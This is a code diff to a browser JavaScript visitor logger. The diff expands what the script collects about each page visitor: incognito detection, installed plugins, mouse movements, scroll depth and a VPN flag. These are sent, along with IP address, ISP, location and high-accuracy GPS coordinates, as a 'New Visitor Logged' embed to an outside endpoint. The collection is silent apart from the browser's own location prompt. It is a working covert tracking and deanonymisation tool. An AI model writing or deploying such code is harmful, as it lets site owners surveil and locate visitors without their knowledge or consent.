@@ -66,7 +66,34 @@
     return visits;
   }
 
-  function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A") {
+  function isIncognito() {
+    return new Promise((resolve) => {
+      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+      if (!fs) resolve(false);
+      else {
+        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+      }
+    });
+  }
+
+  function getPlugins() {
+    return navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "No plugins detected";
+  }
+
+  function trackActivity() {
+    let mouseMoves = 0;
+    let scrollDepth = 0;
+
+    document.addEventListener("mousemove", () => mouseMoves++, { passive: true });
+    document.addEventListener("scroll", () => scrollDepth = Math.max(scrollDepth, window.scrollY), { passive: true });
+
+    return () => ({ mouseMoves, scrollDepth });
+  }
+
+  const activityTracker = trackActivity();
+  const sessionStart = performance.now();
+
+  function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A", incognito = "N/A") {
     const userAgent = navigator.userAgent;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const screenWidth = window.screen.width;
@@ -77,12 +104,14 @@
     const operatingSystem = getOS(userAgent);
     const visitorID = generateVisitorID();
     const visitCount = getVisitHistory();
-    const sessionDuration = performance.now(); // Session time in milliseconds
+    const sessionDuration = ((performance.now() - sessionStart) / 1000).toFixed(2);
+    const activityData = activityTracker();
+    const installedPlugins = getPlugins();
 
     const embedData = {
       "embeds": [{
         "title": "New Visitor Logged",
-        "description": `**Visitor ID:** ${visitorID}\n**Previous Visits:** ${visitCount}\n**Session Time:** ${(sessionDuration / 1000).toFixed(2)} seconds\n\n**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Device:** ${deviceType}\n**OS:** ${operatingSystem}\n**Language:** ${language}\n**Referrer:** ${referrer}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
+        "description": `**Visitor ID:** ${visitorID}\n**Previous Visits:** ${visitCount}\n**Session Time:** ${sessionDuration} seconds\n**Mouse Movements:** ${activityData.mouseMoves}\n**Scroll Depth:** ${activityData.scrollDepth}px\n\n**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**VPN Usage:** ${ipData.anycast ? "Likely VPN" : "No VPN detected"}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Device:** ${deviceType}\n**OS:** ${operatingSystem}\n**Language:** ${language}\n**Referrer:** ${referrer}\n**Incognito Mode:** ${incognito}\n**Installed Plugins:** ${installedPlugins}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
         "color": 3066993,
       }]
     };
@@ -96,24 +125,26 @@
     .catch(error => console.error('Error sending data:', error));
   }
 
-  function logVisitor() {
+  async function logVisitor() {
+    const incognitoStatus = await isIncognito();
+    
     fetch(`https://ipinfo.io?token=${apiKey}`)
       .then(response => response.json())
       .then(ipData => {
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             (position) => {
-              sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+              sendVisitorData(ipData, position.coords.latitude, position.coords.longitude, position.coords.accuracy, incognitoStatus);
             },
             (error) => {
               console.warn("Geolocation permission denied or error:", error);
-              sendVisitorData(ipData);  // Send IP-based location if GPS is denied
+              sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus); 
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         } else {
           console.warn("Geolocation not supported by browser.");
-          sendVisitorData(ipData);
+          sendVisitorData(ipData, "N/A", "N/A", "N/A", incognitoStatus);
         }
       })
       .catch(error => console.error('Error fetching IP data:', error));
